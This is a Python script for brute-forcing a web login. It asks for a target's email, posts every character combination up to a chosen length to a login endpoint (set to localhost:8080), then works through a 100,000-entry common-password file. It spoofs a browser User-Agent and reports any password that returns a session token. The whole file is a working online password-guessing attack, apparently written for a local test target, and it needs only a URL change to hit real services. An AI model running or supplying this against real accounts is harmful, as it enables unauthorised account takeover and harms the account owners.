import requests
import string




url = "http://localhost:8080/auth/login"  #url for login req handling
email = (input("Enter the targets email: "))
passwords = "10-million-password-list-top-100000.txt"  #100000 most common passwords according to wikipedia
maxLength = int(input("Enter the maximum length of combinations to try: "))


#Headers for post requests
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}


#Char set for brute force combination guessing
characters = string.ascii_letters + string.digits + '_' + '.' #a-z, A-Z, 0-9


#generate all length combinations of chars in characters arr
def generateCombinations(characters, length):
    if length == 1:
        return list(characters)
    combinations = []
    for char in characters:
        for subCombination in generateCombinations(characters, length - 1):
            combinations.append(char + subCombination)
    return combinations






#Attempt brute force password guessing for lengths 1 to max_length
print(f"Attempting brute force password guessing for combinations of lengths 1 to {maxLength}...")
for length in range(1, maxLength+1):
    combinations = generateCombinations(characters, length)
    for password in combinations:
        data = {
            "email": email,
            "password": password
        }
        response = requests.post(url, json=data, headers=headers)
        #Check success (session token set and status code 200)
        if response.status_code == 200 and "token" in response.json():
            print(f"Password found!: {password} for user {email}")
            exit()  
        else:
            print(f"[FAILED]: {password}")




#Try 100000 most common passwords according to wikipedia
print(f"Attempting to guess password using common passwords list...")
with open(passwords, "r") as file:
    for password in file:
        password = password.strip()
       
        data = {
            "email": email,
            "password": password
        }
        response = requests.post(url, json=data, headers=headers)  


        #check success
        if response.status_code == 200 and "token" in response.json():
            print(f"Password found!: {password} for user {email}")
            break
        else:
            print(f"[FAILED]: {password}")
